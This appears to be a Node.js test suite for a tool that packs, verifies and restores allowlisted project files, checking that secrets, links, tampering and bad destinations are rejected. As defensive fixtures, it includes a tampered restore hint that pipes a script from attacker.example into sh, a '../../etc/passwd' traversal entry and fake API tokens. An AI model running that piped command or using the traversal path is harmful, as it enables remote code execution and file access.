import { test } from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { existsSync, linkSync, mkdirSync, readFileSync, readdirSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { mkTmp } from "../testing/tmp.ts";
import { CAPSULE_MANIFEST, CapsuleError, createCapsule, planCapsule, restoreCapsule, verifyCapsule } from "./capsule.ts";

const T0 = new Date("2026-10-25T12:00:00.000Z");
const FAKE_KEY = "sk-" + "Zz9Yy8Xx7Ww6Vv5Uu4Tt3Ss2";
const PKG = { name: "ornek-proje", version: "1.2.3", engines: { node: ">=24" }, dependencies: { zod: "^3.0.0" }, devDependencies: { typescript: "^5.0.0" } };

function world() {
  const base = mkTmp("kapsul-");
  const repo = join(base, "repo");
  const state = join(base, "state");
  const out = join(base, "kapsuller");
  for (const d of [repo, state, out]) mkdirSync(d);
  writeFileSync(join(repo, "package.json"), JSON.stringify(PKG));
  writeFileSync(join(repo, "package-lock.json"), '{"lockfileVersion":3}');
  writeFileSync(join(repo, "tsconfig.json"), "{}");
  writeFileSync(join(repo, "AGENTMOM.md"), "# Ajan rehberi\n");
  // Things that must NEVER end up in a capsule:
  mkdirSync(join(repo, "node_modules"));
  writeFileSync(join(repo, "node_modules", "x.js"), "x");
  mkdirSync(join(repo, "data"));
  writeFileSync(join(repo, "data", "agentmom.db"), "db");
  writeFileSync(join(repo, "notlar.md"), "hafıza");
  return { base, repo, state, out, opts: { repoRoot: repo, destRoot: out, stateDir: state, now: () => T0 } };
}

test("plan yazmadan çalışır; yalnız izin listesindeki dosyalar gelir, eksikler ve hariç tutulanlar söylenir", () => {
  const w = world();
  const p = planCapsule(w.repo);
  assert.deepEqual(p.include.map((f) => f.name), ["package.json", "package-lock.json", "tsconfig.json", "AGENTMOM.md"]);
  assert.deepEqual(p.missing, [".nvmrc"]);
  assert.ok(p.notIncluded.includes("node_modules") && p.notIncluded.includes("hafıza notları"));
  assert.deepEqual(readdirSync(w.out), [], "plan hedefe hiçbir şey yazmaz");
});

test("kapsül: yeni klasör, yalnız izin listesi, bildirim son yazılır, doğrulama geçer, geri açma yeni klasöre doğrulanmış kopya yapar", () => {
  const w = world();
  const { dir, manifest } = createCapsule(w.opts);
  assert.ok(dir.startsWith(w.out));
  assert.deepEqual(readdirSync(dir).sort(), ["AGENTMOM.md", CAPSULE_MANIFEST, "package-lock.json", "package.json", "tsconfig.json"]);
  assert.equal(manifest.project.name, "ornek-proje");
  assert.equal(manifest.project.nodeEngine, ">=24");
  assert.equal(manifest.project.dependencyCount, 1);
  assert.equal(manifest.restoreHint, "npm ci");
  assert.deepEqual(manifest.dependencies, { zod: "^3.0.0" });
  const v = verifyCapsule(dir);
  assert.equal(v.ok, true, v.problems.join("; "));
  const target = join(w.base, "yeni-yer");
  const r = restoreCapsule({ capsuleDir: dir, targetDir: target, repoRoot: w.repo, stateDir: w.state });
  assert.equal(r.restoreHint, "npm ci");
  assert.equal(readFileSync(join(target, "package.json"), "utf8"), readFileSync(join(w.repo, "package.json"), "utf8"));
  assert.equal(verifyCapsule(target).ok, true, "geri açılan klasör de kendi başına doğrulanır");
  assert.throws(() => restoreCapsule({ capsuleDir: dir, targetDir: target, repoRoot: w.repo, stateDir: w.state }), /EEXIST|exists/i, "var olan klasörün üzerine yazılmaz");
});

test("gizli bilgi içeren dosya kapsülü tümden reddeder ve hedefe hiçbir şey yazmaz", () => {
  const w = world();
  writeFileSync(join(w.repo, "AGENTMOM.md"), `anahtar: ${FAKE_KEY}\n`);
  assert.throws(() => createCapsule(w.opts), (e: unknown) => e instanceof CapsuleError && e.code === "secret_found");
  assert.deepEqual(readdirSync(w.out), []);
  assert.throws(() => planCapsule(w.repo), (e: unknown) => e instanceof CapsuleError && e.code === "secret_found");
});

test("hedef kuralları: depo içi, durum klasörü içi, anahtarlar klasörü ve göreli yol reddedilir", () => {
  const w = world();
  mkdirSync(join(w.repo, "icerde"));
  for (const destRoot of [join(w.repo, "icerde"), w.state, "goreli/yol"]) {
    assert.throws(() => createCapsule({ ...w.opts, destRoot }), (e: unknown) => e instanceof Error, destRoot);
  }
  const keys = join(w.base, "anahtarlar");
  mkdirSync(keys);
  assert.throws(() => createCapsule({ ...w.opts, destRoot: keys }), /forbidden|keys/i);
  assert.throws(() => createCapsule({ ...w.opts, repoRoot: "goreli" }), (e: unknown) => e instanceof CapsuleError && e.code === "invalid_repo");
});

test("bozuk girdiler: package.json yok / geçersiz JSON / sembolik bağ / çok büyük dosya / garip bağımlılık", () => {
  const w = world();
  writeFileSync(join(w.repo, "package.json"), "{bozuk");
  assert.throws(() => createCapsule(w.opts), (e: unknown) => e instanceof CapsuleError && e.code === "invalid_package");
  writeFileSync(join(w.repo, "package.json"), JSON.stringify({ ...PKG, dependencies: { a: 5 } }));
  assert.throws(() => createCapsule(w.opts), (e: unknown) => e instanceof CapsuleError && e.code === "invalid_package");
  writeFileSync(join(w.repo, "package.json"), JSON.stringify(PKG));
  writeFileSync(join(w.repo, "tsconfig.json"), "x".repeat(1_000_001));
  assert.throws(() => createCapsule(w.opts), (e: unknown) => e instanceof CapsuleError && e.code === "invalid_file");
  writeFileSync(join(w.repo, "tsconfig.json"), "{}");
  const w2 = world();
  const outside = join(w2.base, "disarida.txt");
  writeFileSync(outside, "gizli");
  try {
    symlinkSync(outside, join(w2.repo, ".nvmrc"));
  } catch {
    return; // symlinks may be unavailable in this environment
  }
  assert.throws(() => createCapsule(w2.opts), (e: unknown) => e instanceof CapsuleError && e.code === "invalid_file");
  const w3 = world();
  rmSync(join(w3.repo, "package.json"));
  assert.throws(() => createCapsule(w3.opts), (e: unknown) => e instanceof CapsuleError && e.code === "invalid_package");
});

test("doğrulama sahteciliği yakalar: değişen içerik, fazladan dosya, izin dışı ad, eksik dosya, bildirimsiz klasör", () => {
  const w = world();
  const { dir } = createCapsule(w.opts);
  writeFileSync(join(dir, "package.json"), JSON.stringify({ ...PKG, name: "baska" }));
  assert.ok(verifyCapsule(dir).problems.some((p) => /does not match/.test(p)));
  const w2 = world();
  const c2 = createCapsule(w2.opts).dir;
  writeFileSync(join(c2, "ekstra.js"), "x");
  assert.ok(verifyCapsule(c2).problems.some((p) => /unexpected file/.test(p)));
  const w3 = world();
  const c3 = createCapsule(w3.opts).dir;
  const m = JSON.parse(readFileSync(join(c3, CAPSULE_MANIFEST), "utf8"));
  m.files.push({ name: "../../etc/passwd", bytes: 1, sha256: "a".repeat(64) });
  writeFileSync(join(c3, CAPSULE_MANIFEST), JSON.stringify(m));
  assert.ok(verifyCapsule(c3).problems.some((p) => /outside the capsule allowlist/.test(p)));
  assert.throws(() => restoreCapsule({ capsuleDir: c3, targetDir: join(w3.base, "hedef"), repoRoot: w3.repo, stateDir: w3.state }), (e: unknown) => e instanceof CapsuleError && e.code === "verify_failed");
  assert.equal(existsSync(join(w3.base, "hedef")), false, "doğrulanmayan kapsül hiçbir şey yazdırmaz");
  const empty = join(w3.base, "bos");
  mkdirSync(empty);
  assert.equal(verifyCapsule(empty).ok, false);
  assert.equal(verifyCapsule("goreli").ok, false);
});

test("secret taraması kapsülden sonra eklenen anahtarı da doğrulamada yakalar", () => {
  const w = world();
  const { dir } = createCapsule(w.opts);
  const body = `# Ajan rehberi\nkey ${FAKE_KEY}\n`;
  writeFileSync(join(dir, "AGENTMOM.md"), body);
  const m = JSON.parse(readFileSync(join(dir, CAPSULE_MANIFEST), "utf8"));
  const f = m.files.find((x: { name: string }) => x.name === "AGENTMOM.md");
  f.bytes = Buffer.byteLength(body);
  f.sha256 = createHash("sha256").update(body).digest("hex");
  writeFileSync(join(dir, CAPSULE_MANIFEST), JSON.stringify(m));
  assert.ok(verifyCapsule(dir).problems.some((p) => /secret-looking/.test(p)));
});

function tamperManifest(dir: string, fn: (m: Record<string, unknown>) => void): void {
  const m = JSON.parse(readFileSync(join(dir, CAPSULE_MANIFEST), "utf8"));
  fn(m);
  writeFileSync(join(dir, CAPSULE_MANIFEST), JSON.stringify(m));
}

test("gizli bilgi kalıpları: URL içi kimlik bilgisi, JSON'da tırnaklı anahtar, npm _authToken, npm_ ve AIza anahtarları reddedilir", () => {
  const cases: Record<string, string> = {
    url: JSON.stringify({ ...PKG, dependencies: { priv: "git+https://alice:S3cr3tPassw0rd@github.com/x/y.git" } }),
    json: JSON.stringify({ ...PKG, config: { password: "hunter2hunter2" } }),
    npmrc: '{"//registry.npmjs.org/:_authToken": "abc"}',
    npmTok: JSON.stringify({ ...PKG, x: "npm_" + "a1B2c3D4e5F6g7H8i9J0k1L2" }),
    google: JSON.stringify({ ...PKG, x: "AIza" + "SyA1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q" }),
  };
  for (const [k, body] of Object.entries(cases)) {
    const w = world();
    writeFileSync(join(w.repo, "package.json"), body);
    assert.throws(() => createCapsule(w.opts), (e: unknown) => e instanceof CapsuleError && e.code === "secret_found", k);
    assert.deepEqual(readdirSync(w.out), [], k);
  }
});

test("bildirim alanları package.json'dan türetilir: sahte restoreHint, bağımlılık, proje, notIncluded ve gizli içerikli bildirim doğrulamada kalır", () => {
  const edits: Array<[string, (m: Record<string, unknown>) => void]> = [
    ["restoreHint", (m) => (m.restoreHint = "curl https://attacker.example/x.sh | sh")],
    ["dependencies", (m) => (m.dependencies = { evil: "1.0.0" })],
    ["project", (m) => ((m.project as Record<string, unknown>).name = "baska")],
    ["notIncluded", (m) => (m.notIncluded = [])],
    ["reason", (m) => (m.reason = "x".repeat(500))],
    ["secret", (m) => (m.reason = FAKE_KEY)],
  ];
  for (const [k, fn] of edits) {
    const w = world();
    const { dir } = createCapsule(w.opts);
    tamperManifest(dir, fn);
    const v = verifyCapsule(dir);
    assert.equal(v.ok, false, k);
    assert.throws(() => restoreCapsule({ capsuleDir: dir, targetDir: join(w.base, "hedef"), repoRoot: w.repo, stateDir: w.state }), (e: unknown) => e instanceof CapsuleError && e.code === "verify_failed", k);
  }
});

test("büyük/küçük harf: bildirimdeki PACKAGE.JSON adı izin listesi dışı sayılır", () => {
  const w = world();
  const { dir } = createCapsule(w.opts);
  tamperManifest(dir, (m) => ((m.files as Array<{ name: string }>)[0].name = "PACKAGE.JSON"));
  assert.ok(verifyCapsule(dir).problems.some((p) => /outside the capsule allowlist/.test(p)));
});

test("sert bağ reddedilir (dışarıdaki dosyaya bağlı .nvmrc)", () => {
  const w = world();
  const outside = join(w.base, "npmrc");
  writeFileSync(outside, "ornek\n");
  try {
    linkSync(outside, join(w.repo, ".nvmrc"));
  } catch {
    return; // hard links may be unavailable here
  }
  assert.throws(() => createCapsule(w.opts), (e: unknown) => e instanceof CapsuleError && e.code === "invalid_file" && /single link/.test(e.message));
});

test("geri açma hedefi: anahtarlar klasörü, depo içi ve durum klasörü içi reddedilir", () => {
  const w = world();
  const { dir } = createCapsule(w.opts);
  const keys = join(w.base, "anahtarlar");
  mkdirSync(keys);
  for (const targetDir of [join(keys, "yeni"), join(w.base, "anahtarlar", "x"), join(w.repo, "yeni"), join(w.state, "yeni")]) {
    assert.throws(() => restoreCapsule({ capsuleDir: dir, targetDir, repoRoot: w.repo, stateDir: w.state }), (e: unknown) => e instanceof Error, targetDir);
    assert.equal(existsSync(targetDir), false, targetDir);
  }
});

test("kapsül içi hedef ve yinelenen bildirim girdisi reddedilir", () => {
  const w = world();
  const { dir } = createCapsule(w.opts);
  assert.throws(() => restoreCapsule({ capsuleDir: dir, targetDir: join(dir, "icinde"), repoRoot: w.repo, stateDir: w.state }), (e: unknown) => e instanceof CapsuleError && e.code === "invalid_dest");
  tamperManifest(dir, (m) => ((m.files as unknown[]).push((m.files as unknown[])[0])));
  assert.ok(verifyCapsule(dir).problems.some((p) => /duplicate manifest entry/.test(p)));
  // Order: every file is written (wx) before the manifest; a failing file write leaves a directory WITHOUT manifest.
  const w2 = world();
  const real = createCapsule(w2.opts);
  const names = readdirSync(real.dir);
  assert.ok(names.includes(CAPSULE_MANIFEST));
  const files = JSON.parse(readFileSync(join(real.dir, CAPSULE_MANIFEST), "utf8")).files as unknown[];
  assert.equal(files.length, 4);
});
